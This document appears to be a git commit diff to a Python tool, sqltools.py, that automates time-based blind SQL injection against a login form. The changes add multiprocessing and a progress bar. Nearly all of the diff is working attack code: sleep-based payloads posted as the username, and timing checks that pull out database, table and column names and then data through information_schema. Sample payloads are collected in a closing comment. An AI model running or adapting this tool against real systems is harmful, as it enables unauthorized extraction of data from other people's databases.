f40fd686290500f57a7b102ac414eaf2f9d0eaa3
uguess <474768589@qq.com>
2022-05-03 22:45:52 +0800

    优化了部分时间盲注代码,使用多进程大大加快了速度.同时因为使用多进程后看不见进度,增加了进度条显示功能.

--- sqltools.py
+++ sqltools.py
@@ -4,12 +4,23 @@ from loguru import logger
 import time
 import collections
 import tqdm  # 进度条库
+import multiprocessing as mp
 
+core_num=8
 value = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ%&^@_.-!{}"
 '''
 haveget:
         length:数据库长度
                 curr:当前数据库长度
+                t0:table数
+                t1:table1长度
+                t2:table2长度
+                table:
+                    c0:列数
+                    c1:第1列长度
+                    ………………     
+                    
+                
         database:数据库名字
                 curr:当前数据库名字
         table:表名字
@@ -31,17 +42,11 @@ haveget:
                             1:第一行数据
                             2:第二行数据
                             ………………
-
-
 '''
 haveget = collections.defaultdict(dict)
 
-
-def get_length():
-    '''
-    获取数据库名长度
-    :return: 无
-    '''
+# 获取数据库名长度
+def get_length_database():
     # 该字典存储爆破到的数据库的所有信息
     global haveget
     for n in range(1, 100):
@@ -58,89 +63,125 @@ def get_length():
         # 结束时间
         end_time = time.time()
         use_time = end_time - start_time  # 求出请求前后的时间差来判断是否延时了
-        if use_time > 1.5:
-            print("...... data's length is :" + str(n))
+        if use_time > 1.8:
+            print("...... database's length is :" + str(n))
             # 字典储存
             haveget['length'] = {'curr': n}
             return
 
+def check_database(parameter):
+    n,v,url=parameter
+    payload = "test' and if(ascii(substr(database(),{0},1))={1},sleep(3),null)#".format(n, ord(v))
+    data = {"username": payload, "password": '123'}
+    start_time = time.time()
+    requests.post(url, data=data)
+    end_time = time.time()
+    use_time = end_time - start_time
+    if use_time > 1.8:return True
+    return False
 
-def get_database():  # 获取数据
+# 获取数据库名
+def get_database(url):
     global haveget
-    result = ''
-    # 得到当前数据库名长度
-    # 这里也需要优化，考虑获得的非当前数据库时的情况
     length = haveget['length']['curr'] + 1
-    # 遍历长度
-    for n in range(1, length):
-        # 遍历字典
-        # 这里可以优化，考虑多线程
-        for v in value:
-            # 一般payload，优化点与前述相同
-            payload = "test' and if(ascii(substr(database(),{0},1))={1},sleep(3),null)#".format(n, ord(v))
+    arg1 = [(i, j,url) for i in range(1, length) for j in value]
+    with mp.Pool(core_num) as p:
+        res=list(tqdm.tqdm(p.imap(check_database, arg1), total=len(arg1)))
+    ans = [''] * 100
+    for i in range(len(res)):
+        if res[i]: ans[arg1[i][0]] = arg1[i][1]
+    haveget['database'] = {'curr': ''.join(ans)}
 
+# 获取数表数量
+def get_table_num():
+    '''
+    获取数据库表单数
+    :return:
+    '''
+    # 该字典存储爆破到的数据库的所有信息
+    global haveget
+    for n in range(1, 100):
+        # 一般payload
+        # 这里存在优化点，用户名不一定是test
+        payload = "test' and if((select count(*) from information_schema.tables where table_schema=database())={0},sleep(2),1) #".format(n)
+        # 传参表，考虑这里也需要优化，因为不一定都是username 和 password
+        # 优化考虑从post表单里得到参数信息
+        data = {"username": payload, "password": '123'}
+        # 开始时间
+        start_time = time.time()
+        # post传参
+        requests.post(url, data=data)
+        # 结束时间
+        end_time = time.time()
+        use_time = end_time - start_time  # 求出请求前后的时间差来判断是否延时了
+        if use_time > 1.8:
+            print("...... table num is:" + str(n))
+            # 字典储存
+            haveget['length'] = {'t0': n}
+            break
+
+# 获取表长度
+def get_length_table():
+    global haveget
+    for i in range(haveget['length']['t0']):
+        for n in range(1, 100):
+            payload = "test' and if((select length(table_name) from information_schema.tables where table_schema=database() limit {0},1)={1},sleep(2),1) #".format(i,n)
+            data = {"username": payload, "password": '123'}
+            start_time = time.time()
+            requests.post(url, data=data)
+            end_time = time.time()
+            use_time = end_time - start_time  # 求出请求前后的时间差来判断是否延时了
+            if use_time > 1.8:
+                print("...... table {0} length is:".format(i+1) + str(n))
+                haveget['length']['t{}'.format(i+1)] = n
+                break
+
+# 判断表字符
+def check_table(parameter):
+    i,j,v,url=parameter
+    # 一般payload，优化点与前述相同
+    payload = "test' and if(ascii(substr((select table_name from information_schema.tables where table_schema =database() limit {0},1),{1},1))={2},sleep(2),null) #".format(i, j, ord(v))
+    data = {"username": payload, "password": '123'}
+    start_time = time.time()
+    requests.post(url, data=data)
+    end_time = time.time()
+    use_time = end_time - start_time
+    if use_time > 1.8:return True
+    return False
+
+# 获取表名
+def get_table(url):
+    global haveget
+    haveget['table']['curr'] = {}
+    arg1=[(i,j,v,url) for i in range(haveget['length']['t0']) for j in range(1,haveget['length']['t{}'.format(i+1)]+1) for v in value]
+    with mp.Pool(core_num) as p:
+        res=list(tqdm.tqdm(p.imap(check_table, arg1), total=len(arg1)))
+    ans = []
+    for i in range(haveget['length']['t0']):
+        ans.append(['']*(haveget['length']['t{}'.format(i+1)]+1))
+    for i in range(len(res)):
+        if res[i]:
+            ans[arg1[i][0]][arg1[i][1]] = arg1[i][2]
+    for i in range(haveget['length']['t0']):
+        haveget['table']['curr'][i+1] = ''.join(ans[i])
+    haveget['table']['curr'][0] = haveget['length']['t0']
+
+# 获取表的列数
+def get_column_num():
+    global haveget
+    for i in range(haveget['table']['curr'][0]):
+        table=haveget['table']['curr'][i+1]
+        for n in range(1, 100):
+            payload = "test' and if((select count(*) from information_schema.columns where table_name='{0}')={1},sleep(2),1) #".format(table,n)
             data = {"username": payload, "password": '123'}
             start_time = time.time()
             requests.post(url, data=data)
             end_time = time.time()
             use_time = end_time - start_time
-            if use_time > 1.5:
-                result += v
-                # 当前行刷新
-                print("\r", "......" + result, end="", flush=True)
+            if use_time > 1.8:
+                print("......the column num of {0} table is:".format(i+1) + str(n))
+                haveget['length'][table] = {'c0': n}
                 break
-    haveget['database'] = {'curr': result}
-    return
-
-
-def get_table():
-    # 为表单编号，从1开始，0存储的是一共有几个表单
-    currTableIndex = 1
-    global haveget
-    haveget['table']['curr'] = {}
-    tablename = ''
-    # 最多能扫描到100个表单
-    for j in range(100):
-        # 当前数据库表单扫描完毕标志
-        tableNumGetComplete = True
-        # 最多能扫描表单名长度为1000
-        for i in range(1, 1000):
-            # 当前表单名字扫描完毕标志
-            tableNameGetComplete = True
-            # 遍历字典
-            for v in value:
-                # 一般payload，优化点与前述相同
-                payload = "test' and if(ascii(substr((select table_name from information_schema.tables where table_schema =database()limit {0},1),{1},1))={2},sleep(2),null) #".format(
-                    j, i, ord(v))
-                data = {"username": payload, "password": '123'}
-                start_time = time.time()
-                requests.post(url, data=data)
-                end_time = time.time()
-                use_time = end_time - start_time
-                if use_time > 1.5:
-                    # 如果当前还能获取到表单名，表示表单名获取还未完毕
-                    tableNameGetComplete = False
-                    tablename += v
-                    print("\r", "......" + tablename, end="", flush=True)
-                    break
-            # 如果表单名获取完毕，判断当前获取的表单名是否为空，不为空则说明还有表单未获取
-            if tableNameGetComplete:
-                if tablename != '':
-                    tableNumGetComplete = False
-                    # 将获取到的表单名字存入当前数据库中
-                    haveget['table']['curr'][currTableIndex] = tablename
-                    currTableIndex += 1
-                    print("\r", ".....table name is :" + tablename, flush=True)
-                tablename = ''
-                break
-        # 如果当前数据库全部表单获取完毕，break
-        if tableNumGetComplete: break
-    # 获取完毕计算当前数据库一共有多少个表单，存入0处
-    # 这里减1是因为每次都会在空时才退出，因此必然每次都会多获取1
-    haveget['table']['curr'][0] = currTableIndex - 1
-    # print(haveget)
-    return
-
 
 # 获取列名
 def get_column():
@@ -281,27 +322,29 @@ if __name__ == "__main__":
 
     if args.get == 'all':
         logger.info('{0}  正在获取当前数据库名长度......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
-        get_length()
+        get_length_database()
         logger.info('{0}  正在获取当前数据库名......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
-        get_database()
+        get_database(url)
         print("\r", ".....the database name is :" + haveget['database']['curr'], flush=True)
+        logger.info('{0}  正在获取当前数据库内表单数......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
+        get_table_num()
+        logger.info('{0}  正在获取表单名长度......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
+        get_length_table()
         logger.info('{0}  正在获取当前数据库表名......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
-        get_table()
+        get_table(url)
+        logger.info('{0}  正在获取当前各表列数......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
+        get_column_num()
         logger.info('{0}  正在获取当前表列名......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
         get_column()
         logger.info('{0}  获取数据......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
         get_data()
         logger.info('{0}  获取完毕！'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
-    else:
-        if args.get == 'database':
-            logger.info('{0}  正在获取当前数据库名......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
-            get_length()
-            database = get_database()
-            print("\r", ".....the database name is :" + haveget['database']['curr'], flush=True)
-            logger.info('{0}  获取完毕！'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
-        elif args.get == 'table':
-            logger.info('{0}  正在获取当前数据库表名......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
-            get_table()
-            logger.info('{0}  获取完毕！'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
-        else:
-            logger.info('{0}  错误，当前功能暂未实现！'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
+
+
+
+'''
+payload:
+表单数:test' and if((select count(*) from information_schema.tables where table_schema=database())=1,sleep(2),1) #
+列数:test' and if((select count(*) from information_schema.columns where table_name='pinfo')=4,sleep(2),1) #
+'''
+
